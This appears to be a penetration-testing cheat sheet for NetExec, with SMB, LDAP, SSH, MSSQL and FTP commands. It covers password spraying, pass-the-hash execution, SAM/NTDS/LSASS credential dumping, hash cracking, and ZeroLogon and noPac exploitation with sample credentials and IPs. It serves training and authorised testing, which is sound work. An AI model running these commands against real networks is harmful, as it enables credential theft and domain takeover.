---
cover: ../../../.gitbook/assets/nxc_logo.avif
coverY: 0
---

# NetExec

[NetExec](https://github.com/Pennyw0rth/NetExec) (`nxc`) is a **network service exploitation tool** that helps automate assessing the security of large networks. Check out its amazing and ever-evolving [wiki page](https://www.netexec.wiki/)! You can view its usage in almost any of the [AD-related boxes](../../../boxes/categories.md).

## SMB

### Enumeration

{% tabs %}
{% tab title="Users" %}
Enumerate domain/local users:

{% code overflow="wrap" %}
```bash
# List domain users
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --users
# List local users
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --users --local-auth

# Create a users list from nxc's output
$ nxc smb <target> -u <user> -p <pass> --users | awk '$1 == "SMB" && $5 != "[+]" && $5 != "-Username-" && $5 != "[*]" && $5 != "Guest" && $5 != "krbtgt" {print $5}' > domain_users
```
{% endcode %}

Domain users can be also be enumerated via a RID-bruteforcing attack:

```bash
# Brute-force RIDs (default up to 4000)
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --rid-brute <max-rid>
# Create a users list from nxc's output
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --rid-brute <max-rid> > nxc_users
cat nxc_users | awk '{print $6}' | awk -F'\' '{print $2}' > domain_users
```

Enumerate domain/local hosts:

```bash
# List domain hosts
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --computers
# List local hosts
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --computers --local-auth
```
{% endtab %}

{% tab title="Shares" %}
{% code overflow="wrap" %}
```bash
# List SMB shares
nxc smb <TARGET-IP> --shares
# List SMB shares via a NULL session
nxc smb <TARGET-IP> -p '' -u '' --shares
# List SMB shares via a guest session
nxc smb <TARGET-IP> -p 'guest' -u '' --shares
# List SMB shares via an anonymous session
nxc smb <TARGET-IP> -p 'anonymous' -u '' --shares
```
{% endcode %}
{% endtab %}

{% tab title="Groups" %}
{% code overflow="wrap" %}
```bash
# List domain groups
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --groups --local-groups 
# List local groups
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --local-groups 
```
{% endcode %}
{% endtab %}

{% tab title="Active Sessions" %}
```bash
# List active sessions
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --sessions
# List logged on users
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --loggedon-users
```
{% endtab %}

{% tab title="Pass Policy" %}
```bash
# List the domain's password policy
nxc smb <TARGET-IP> -u '<USER>' -p '<PASS>' --pass-pol
```
{% endtab %}
{% endtabs %}

### Password Spray

{% tabs %}
{% tab title="Local" %}
{% code overflow="wrap" %}
```bash
$ nxc smb <target> -u <user> -p <pass> -d <domain> --continue-on-success
```
{% endcode %}

If the results include the `domain` , e.g. (`seruca.yzx`) → a domain account.&#x20;

{% code overflow="wrap" %}
```bash
...
SMB 192.168.X.97  445 DC01   [+] secura.yzx\bob:Pass123!
```
{% endcode %}

If it has `(Pw3d!)` at the end → Local `Administrator` account.

{% code overflow="wrap" %}
```bash
...
SMB 192.168.X.95 445 SECURE [+] secura.yzx\bob:Pass123! (Pwn3d!)
```
{% endcode %}
{% endtab %}
{% endtabs %}

### RCE

{% tabs %}
{% tab title="PtH" %}
NetExec uses `impacket-psexec` to perform the Pass-the-Hash attack:

```bash
nxc smb <target> -u <user> --H <hash> -X <command>
```
{% endtab %}
{% endtabs %}

### Spidering

{% tabs %}
{% tab title="Filters" %}
```bash
# Only spider files, enable file content searching
nxc smb <ip> -u <user> -p <pass> --spider <share> --only-files --content

# Spider a specific directory
nxc smb <ip> -u <user> -p <pass> --spider <share> --spider-folder <folder>
```
{% endtab %}

{% tab title="TXT Files" %}
```bash
nxc smb <ip> -u <user> -p <pass> --spider <share> --pattern txt
```
{% endtab %}

{% tab title="File Content" %}
```bash
nxc smb <ip> -u <user> -p <pass> --spider <share> --content --regex Encrypt
```
{% endtab %}

{% tab title="Recursive" %}
```bash
nxc smb <ip> -u <user> -p <pass> --spider <share> --regex . --depth 1
```
{% endtab %}

{% tab title="spider_plus" %}
List and dump all files all readable shares:

```bash
nxc smb <ip> -u <user> -p <pass> -M spider_plus -o DOWNLOAD_FLAG=True
```
{% endtab %}
{% endtabs %}

### Upload/Download

If large files are failing/erroring, add  `--smb-timeout` with a value than 2.

{% tabs %}
{% tab title="Download" %}
{% code overflow="wrap" %}
```bash
nxc smb <ip> -u <user> -p <pass> --share <share> --get-file <\\path\\to\\file> <local-file>
```
{% endcode %}
{% endtab %}

{% tab title="Upload" %}
{% code overflow="wrap" %}
```bash
nxc smb <ip> -u <user> -p <pass> --share <share> --put-file <local-file> <\\path\\to\\upload\\file>
```
{% endcode %}
{% endtab %}

{% tab title="Share" %}
{% code overflow="wrap" %}
```bash
nxc smb <ip> -u <user> -p <pass> -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=420000 OUTPUT_FOLDER=./ EXCLUDE_FILTER=admin$,print$,ipc$,netlogon,sysvol
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Modules

{% hint style="info" %}
For **stealing hashes via writeable shares** via SMB using `slinky`, `drop-sc`, or `scuffy` check [here](../../../services/shares/smb-139-445.md#hashes).
{% endhint %}

{% tabs %}
{% tab title="Creds" %}
asdas

```bash
# SAM
nxc smb <ip> -u <user> -p <pass> --sam

# NTDS
nxc smb <ip> -u <user> -p <pass> --ntds --user <user>

# LSA
nxc smb <ip> -u <user> -p <pass> --lsa
```

The hash format that starts with `$DCC2$` (derived from `--lsa`) is **stronger than NTLM** and **cannot be used for a PtH attack**. For attempting to crack them, the domain and username needs to be removed; only the value starting with `$DCC2$` is required.

{% code overflow="wrap" %}
```bash
# Convert DCC2 hashes
$ cat MS01_10.129.204.133_2022-11-08_093944.cached| cut -d ":" -f 2
$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3
$DCC2$10240#david#a8338587a1c6ee53624372572e39b93f
$DCC2$10240#john#fbdeac2c1d121818f75796cedd0caf0a

# Crack hashes
hashcat -m2100 hashes.txt /usr/share/wordlists/rockyou.txt
```
{% endcode %}
{% endtab %}

{% tab title="NICs" %}
Enumerate network interfaces:

```bash
# Via WMI
nxc smb <ip> -u <user> -p <pass> -M get_netconnections

# Via RPC
nxc smb <ip> -u <user> -p <pass> -M ioxidresolver
```
{% endtab %}

{% tab title="KeePass" %}
Locate the configuration file:

```bash
nxc smb <ip> -u <user> -p <pass> -M keepass_discover
```

Check for credentials:

{% code overflow="wrap" %}
```bash
nxc smb <ip> -u <user> -p <pass> -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml 
```
{% endcode %}

Check `/tmp/export.xml` after.
{% endtab %}

{% tab title="GPP" %}
Retrieve the plaintext password for accounts pushed through GPPs:

```bash
nxc smb <ip> -u <user> -p <pass> -M gpp_password
```

Search for `registry.xml` files for autologin information:

```bash
nxc smb <ip> -u <user> -p <pass> -M gpp_autologin
```
{% endtab %}

{% tab title="RDP" %}
Enable RDP:

```bash
nxc smb <ip> -u <user> -p <pass> -M rdp -o ACTION=enable
```
{% endtab %}

{% tab title="LSASS" %}
Python-based, uses `impacket` to read the LSASS dump and `pypykatz` to extract credentials:

```bash
nxc smb <ip> -u <user> -p <pass> -M lsassy
```

Uses the Sysinternals `procdump` to create the LSASS dump and `pypykatz` to extract credentials:

```bash
nxc smb <ip> -u <user> -p <pass> -M procdump
```

Uses clone handles to create an obfuscated dump:

```bash
nxc smb <ip> -u <user> -p <pass> -M handlekatz
```

Opening a handle to LSASS can be detected, so it searches for existing handles, and if one is found, it copies it and creates a LSASS minidump:

```bash
nxc smb <ip> -u <user> -p <pass> -M nanodump
```
{% endtab %}
{% endtabs %}

### Vulnerabilities

The **most critical vulnerabilities**: from no creds/low privileges straight to `DA` !

{% tabs %}
{% tab title="Hail Mary" %}
Check for all at once:

{% code overflow="wrap" %}
```bash
$ nxc smb dc01 -u <user> -p <pass> -M zerologon -M nopac -M printnightmare -M smbghost -M ms17-010
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="ZeroLogon" %}
ZeroLogon (CVE-2020-1472) is a vulnerability in Microsoft’s Netlogon protocol that lets an attacker with network access spoof a DC, reset its password to blank, and **gain full domain admin rights—without any credentials**.

```bash
# Check for the vulnerability
nxc smb <dc-ip> -u '' -p '' -M zerologon
```

There is a [PoC](https://github.com/dirkjanm/CVE-2020-1472) available:

{% code overflow="wrap" %}
```bash
# Exploit
./cve-2020-1472-exploit.py <DC-netBIOS-name> <dc-ip>

# Dump the administrator's hash
$ impacket-secretsdump -just-dc -no-pass <DC-netBIOS-name>\$@<dc-ip> -just-dc-user administrator

# Restore password
./restorepassword.py <DC-netBIOS-name>@<DC-IP> -target-ip <DC-IP> -hexpass <plaintext-machine-password>
```
{% endcode %}
{% endtab %}

{% tab title="noPAC" %}
noPAC is a vulnerability that lets an attacker with low-privileged domain access abuse misconfigured delegation and Kerberos to impersonate DCs and gain `Domain Admin` rights by forging a Privileged Attribute Certificate (PAC).

```bash
# Check for the vulnerability
$ nxc smb dc01 -u <user> -p <pass> -M nopac
```

There is a [PoC](https://github.com/Ridter/noPac) available:

{% code overflow="wrap" %}
```bash
# Get the ST
python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203

# Get RCE
python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 -shell --impersonate administrator

# Dump hash
python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump

python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump -just-dc-user cgdomain/krbtgt
```
{% endcode %}
{% endtab %}

{% tab title="PrintNightmare" %}
PrintNightmare is a critical Windows Print Spooler vulnerability that allows an attacker with network or local access to **execute code as** `SYSTEM` on a DC or any Windows machine, enabling full takeover of the system and often the entire domain.

```bash
# Check for the vulnerability
nxc smb <ip> -u '' -p '' -M printnightmare
```
{% endtab %}

{% tab title="SMBGhost" %}
SMBGhost (CVE-2020-0796) is a critical vulnerability in the `SMBv3` protocol that lets an attacker remotely execute code on vulnerable Windows systems by sending specially crafted packets, allowing **full control without authentication**. It targets any `SMBv3`-enabled host on the network, including DCs.

```bash
# Check for the vulnerability
nxc smb <ip> -u '' -p '' -M smbghost
```
{% endtab %}

{% tab title="MS17-010" %}
MS17-010 is a critical Windows SMB vulnerability, aka **EternalBlue**, that allows remote attackers to **execute code on vulnerable systems without authentication** by exploiting flaws in `SMBv1`. It targets any SMBv1-enabled Windows host, including DCs, enabling full system takeover.

```bash
# Check for the vulnerability
nxc smb <ip> -u '' -p '' -M ms17-010
```
{% endtab %}
{% endtabs %}

Checks for coerce vulnerabilities. By default the `LISTENER` ip will be set to `localhost`, so no traffic will appear on the network.

{% tabs %}
{% tab title="coerce_plus" %}
The `coerce_plus` module includes:

* **PetitPotam**: Coerces a DC to authenticate to an attacker via `MS-EFSRPC`, enabling NTLM relay attacks for domain takeover.
* **DFSCoerce**: Tricks a DC into authenticating to the attacker via the Distributed File System service, enabling relay attacks.
* **PrinterBug**: Exploits Windows Print Spooler to coerce authentication and enable NTLM relay attacks.
* **MSEven**: Uses the Microsoft Exchange’s Web Services to force authentication, facilitating NTLM relay and privilege escalation.
* **ShadowCoerce**: Coerces a domain host to authenticate by abusing the Shadow Copy service, enabling relay attacks.

```bash
# Check for the vulnerabilities
$ nxc smb dc01 -u <user> -p <pass> -M coerce_plus
```

If one or more are found, set the listener:

{% code overflow="wrap" %}
```bash
# Run all exploit methods at once
nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<attacker-ip> ALWAYS=true

# Run a specific method
$ nxc smb dc01 -u <user> -p <pass> -M coerce_plus -o M=DFSCoerce L=<attacker-ip> ALWAYS=true
```
{% endcode %}
{% endtab %}
{% endtabs %}

## LDAP

{% tabs %}
{% tab title="GMSA" %}
```bash
nxc ldap dc01.rebound.htb -u <user> -p <pass> -k --gmsa
```
{% endtab %}

{% tab title="Whoami" %}
```bash
nxc ldap <target> -u <user> -p <pass> -M whoami -o USER=<user>
```
{% endtab %}

{% tab title="Zone Transfer" %}
```bash
nxc ldap <target> -u <user> -p <pass> -M get-network -o ALL=true
```
{% endtab %}

{% tab title="LAPS" %}
```bash
nxc ldap <ip> -u <user> -p <pass> -M laps
```
{% endtab %}

{% tab title="DACL" %}
{% code overflow="wrap" %}
```bash
nxc ldap <ip> -u <user> -p <pass> -M daclread -o TARGET=<user> ACTION=read

# DCSync rights
nxc ldap <ip> -u <user> -p <pass> -M daclread -o TARGET_DN="DC=inlanefreight,DC=htb" ACTION=read RIGHTS=DCSync
```
{% endcode %}
{% endtab %}

{% tab title="Desc" %}
Enumerate the description field of domain users ([`get-desc-users`](https://www.netexec.wiki/ldap-protocol/get-user-descriptions)):

```bash
# Enumerate all users
nxc ldap DC01 -u '' -p '' -M get-desc-users

# Filter for a target string
nxc ldap DC01 -u '' -p '' -M get-desc-users -o FILTER='string'

# Look for passwords
nxc ldap DC01 -u '' -p '' -M get-desc-users -o PASSWORDPOLICY=True MINLENGTH=8
```
{% endtab %}
{% endtabs %}

## SSH

{% tabs %}
{% tab title="Auth" %}
```bash
# Password authentication
nxc ssh <target> -u <user> -p <pass>

# Key authentication
nxc ssh <target> -u <user> -p '' --key-file root_id_rsa

# Port specification
nxc ssh <target> -u <user> -p <pass> --port 2222
```
{% endtab %}

{% tab title="Password Spray" %}
{% code overflow="wrap" %}
```bash
nxc ssh <target> -u userfile -p passwordfile --no-bruteforce --continue-on-success
```
{% endcode %}
{% endtab %}

{% tab title="RCE" %}
```bash
nxc ssh <target> -u <user> -p <pass> -x <command>
```
{% endtab %}

{% tab title="Transfers" %}
```bash
# Upload
nxc ssh <target> -u <user> -p <pass> --put-file file.txt /tmp/file.txt

# Download
nxc ssh <target> -u <user> -p <pass> --get-file /tmp/file.txt file.txt
```
{% endtab %}
{% endtabs %}

## MSSQL

{% tabs %}
{% tab title="Auth" %}
Two methods can be used to authenticate to MSSQL: Windows (default) & local auth:

```bash
# 1. Windows auth

# With SMB port open
nxc mssql <target> -u <user> -p <pass>

# With SMB port closed
nxc mssql <target> -u <user> -p <pass> -d <domain>

# 2. Local auth
nxc mssql <target> -u <user> -p <pass> --local-auth
```

Ports can be also be specified:

```bash
nxc mssql <target> -u <user> -p <pass> --port <port>
```
{% endtab %}

{% tab title="Pass Spray" %}
{% code overflow="wrap" %}
```bash
nxc mssql <target> -u userfile -p passwordfile --no-bruteforce --continue-on-success
```
{% endcode %}
{% endtab %}

{% tab title="PrivEsc" %}
From standard user to DBA:

```bash
# Check if possible
nxc mssql <ip> -u user -p password -M mssql_priv

# Impersonate
nxc mssql <ip> -u user -p password -M mssql_priv -o ACTION=privesc

# Rollback
nxc mssql <ip> -u user -p password -M mssql_priv -o ACTION=rollback
```
{% endtab %}

{% tab title="RCE" %}
{% code overflow="wrap" %}
```bash
# Remote queries
nxc mssql <target> -u <user> -p <pass> --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'

# System RCE via xp_cmdshell
nxc mssql <target> -u <user> -p <pass> --local-auth -x whoami
```
{% endcode %}
{% endtab %}

{% tab title="Transfers" %}
{% code overflow="wrap" %}
```bash
# Upload
nxc mssql <target> -u <user> -p <pass> --put-file /tmp/users C:\\Windows\\Temp\\whoami.txt

# Download
nxc mssql <target> -u <user> -p <pass> --get-file C:\\Windows\\Temp\\whoami.txt /tmp/file
```
{% endcode %}
{% endtab %}
{% endtabs %}

## FTP

{% tabs %}
{% tab title="Pass Spray" %}
{% code overflow="wrap" %}
```bash
nxc ftp <target> -u userfile -p passwordfile --no-bruteforce --continue-on-success
```
{% endcode %}
{% endtab %}

{% tab title="File Listing" %}
```bash
# List root directory
nxc ftp <target> -u <user> -p <pass> --ls

# List a specific directory
nxc ftp <target> -u <user> -p <pass> --ls <dir>
```
{% endtab %}

{% tab title="Transfers" %}
```bash
# Download
nxc ftp <target> -u <user> -p <pass> --get <file>

# Upload
nxc ftp <target> -u <user> -p <pass> --put <local-file> <remote-file>
```
{% endtab %}
{% endtabs %}

## Resources

* A nice short demnostration of `nxc`'s usage ([video](https://www.youtube.com/watch?v=3SQMZzb4CnM))
* The amazing CME-based academy module from Hack The Box ([module](https://academy.hackthebox.com/course/preview/using-crackmapexec))
